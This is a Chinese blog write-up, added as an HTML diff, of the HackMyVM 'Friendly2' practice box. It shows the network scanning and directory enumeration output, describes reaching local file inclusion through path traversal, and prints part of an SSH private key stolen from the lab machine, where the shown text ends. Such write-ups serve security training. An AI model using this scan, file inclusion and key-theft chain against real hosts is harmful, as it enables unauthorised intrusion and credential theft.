@@ -1,0 +1,377 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-Friendly2 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="难度:easy kali:192.168.56.104 靶机:192.168.56.178 ┌──(root㉿kali2)-[~&#x2F;Desktop] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104 Starting arp-scan 1.10.0 with 256">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-Friendly2">
+<meta property="og:url" content="https://tao0845.github.io/posts/ed97f61a/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="难度:easy kali:192.168.56.104 靶机:192.168.56.178 ┌──(root㉿kali2)-[~&#x2F;Desktop] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104 Starting arp-scan 1.10.0 with 256">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/rGfCeV8f.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/foi7f1zp.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/JYyFTUkH.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/SkYnR4N1.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/hAGTpo3B.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/j3PBmcu9.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/yHlzNIrz.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/ow3Q355F.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/bDBd9xiw.png">
+<meta property="og:image" content="https://img2.imgtp.com/2024/05/27/kx46R897.png">
+<meta property="article:published_time" content="2024-05-27T10:13:53.924Z">
+<meta property="article:modified_time" content="2024-06-07T05:26:52.616Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="环境变量劫持">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2.imgtp.com/2024/05/27/rGfCeV8f.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">69</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">107</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B-LFI"><span class="toc-number">3.</span> <span class="toc-text">web信息探测+LFI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#getshell"><span class="toc-number">4.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83user"><span class="toc-number">5.</span> <span class="toc-text">提权user</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/ed97f61a/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-Friendly2</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-05-27 18:13:53" itemprop="dateCreated datePublished" datetime="2024-05-27T18:13:53+08:00">2024-05-27</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-06-07 13:26:52" itemprop="dateModified" datetime="2024-06-07T13:26:52+08:00">2024-06-07</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.9k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">11m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">环境变量劫持</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:easy</strong></p>
+<p><strong>kali:192.168.56.104</strong></p>
+<p><strong>靶机:192.168.56.178</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># arp-scan -l</span>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.100  08:00:27:af:e6:ce       PCS Systemtechnik GmbH
+<span class="token number">192.168</span>.56.178  08:00:27:0c:8f:a4       PCS Systemtechnik GmbH
+
+<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
+Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.919</span> seconds <span class="token punctuation">(</span><span class="token number">133.40</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># nmap 192.168.56.178 -sV -A  -p-</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-27 <span class="token number">18</span>:14 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.178
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00056s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE SERVICE VERSION
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span>+deb11u1 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">3072</span> <span class="token number">74</span>:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">16</span>:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">65</span>:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.56 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-title: Servicio de Mantenimiento de Ordenadores
+<span class="token operator">|</span>_http-server-header: Apache/2.4.56 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
+MAC Address: 08:00:27:0C:8F:A4 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+Device type: general purpose
+Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
+Network Distance: <span class="token number">1</span> hop
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="token number">1</span>   <span class="token number">0.56</span> ms <span class="token number">192.168</span>.56.178
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">12.70</span> seconds</code></pre>
+<p>开启了22 80两个端口，先去web看下<br><img src="https://img2.imgtp.com/2024/05/27/rGfCeV8f.png" alt="1716808904725.png" loading="lazy"><br>没什么功能点，直接扫目录</p>
+<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># gobuster dir -u http://192.168.56.178/ -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.6
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.178/
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2698</span><span class="token punctuation">]</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/tools                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">316</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.178/tools/<span class="token punctuation">]</span>
+/assets               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">317</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.178/assets/<span class="token punctuation">]</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Finished
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
+<p>直接去看tools</p>
+<h1 id="web信息探测-LFI"><a href="#web信息探测-LFI" class="headerlink" title="web信息探测+LFI"></a>web信息探测+LFI</h1><p><img src="https://img2.imgtp.com/2024/05/27/foi7f1zp.png" alt="1716808904725.png" loading="lazy"><br>源码发现了东西<br><img src="https://img2.imgtp.com/2024/05/27/JYyFTUkH.png" alt="1716808904725.png" loading="lazy"><br><img src="https://img2.imgtp.com/2024/05/27/SkYnR4N1.png" alt="1716808904726.png" loading="lazy"><br>盲猜文件包含，直接尝试一手<br><img src="https://img2.imgtp.com/2024/05/27/hAGTpo3B.png" alt="1716808904726.png" loading="lazy"><br><img src="https://img2.imgtp.com/2024/05/27/j3PBmcu9.png" alt="1716808904726.png" loading="lazy"><br><img src="https://img2.imgtp.com/2024/05/27/yHlzNIrz.png" alt="1716808904726.png" loading="lazy"><br><img src="https://img2.imgtp.com/2024/05/27/ow3Q355F.png" alt="1716808904727.png" loading="lazy"><br>好在功夫不负有心人，目录穿越成功LFI<br>尝试apache日志rce<br><img src="https://img2.imgtp.com/2024/05/27/bDBd9xiw.png" alt="1716808904727.png" loading="lazy"><br>未果<br>尝试读取用户ssh私钥<br><img src="https://img2.imgtp.com/2024/05/27/kx46R897.png" alt="1716808904727.png" loading="lazy"><br>nice,拿到私钥就可以拿到shell了，格式有点乱，让ai整理一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># cat aaa      </span>
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
